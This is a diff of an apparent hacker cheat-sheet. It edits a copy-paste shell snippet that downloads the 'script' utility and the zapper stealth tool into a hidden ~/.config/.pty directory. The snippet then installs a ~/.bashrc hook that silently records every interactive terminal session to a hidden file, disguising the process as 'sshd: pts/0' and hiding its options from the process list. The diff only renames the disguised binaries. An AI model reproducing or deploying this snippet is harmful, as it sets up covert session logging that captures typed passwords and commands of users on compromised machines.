@@ -1894,12 +1894,12 @@ Cut & paste the following and follow the instructions:
 ```sh
 command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
 && { mkdir -p ~/.config/.pty 2>/dev/null; [ $(uname -m) == aarch64 ] && s=aarch64_arm64; :; } \
-&& curl -o ~/.config/.pty/sshd@pty0 -fsSL "https://bin.ajam.dev/${s:-x86_64}_Linux/Baseutils/script" \
-&& chmod 755 ~/.config/.pty/sshd@pty0 \
-&& curl -o ~/.config/.pty/clear -fsSL https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m) \
-&& chmod 755 ~/.config/.pty/clear \
+&& curl -o ~/.config/.pty/pty -fsSL "https://bin.ajam.dev/${s:-x86_64}_Linux/Baseutils/script" \
+&& chmod 755 ~/.config/.pty/pty \
+&& curl -o ~/.config/.pty/ini -fsSL https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m) \
+&& chmod 755 ~/.config/.pty/ini \
 && echo 'SUCCESS. Add this to the ~/.bashrc:' \
-&& echo -e '\e[0;35m[ -z "$LC_PTY" ] && [ -t0 ] && [[ "$HISTFILE" != *null* ]] && [ -e ~/.config/.pty/clear ] && [ -e ~/.config/.pty/sshd@pty0 ] && LC_PTY=1 exec ~/.config/.pty/clear ~/.config/.pty/sshd@pty0 -qaec "exec -a -bash '"$(command -v bash)"'" -I ~/.config/.pty/.@pty-unix.$$\e[0m'
+&& echo -e '\e[0;35m[ -z "$LC_PTY" ] && [ -t0 ] && [[ "$HISTFILE" != *null* ]] && [ -x ~/.config/.pty/ini ] && [ -x ~/.config/.pty/pty ] && LC_PTY=1 exec ~/.config/.pty/ini -a "sshd: pts/0" ~/.config/.pty/pty -qaec "exec -a -bash '"$(command -v bash)"'" -I ~/.config/.pty/.@pty-unix.$$\e[0m'
 ```
 
 - Combined with zapper to hide command options from the process list.
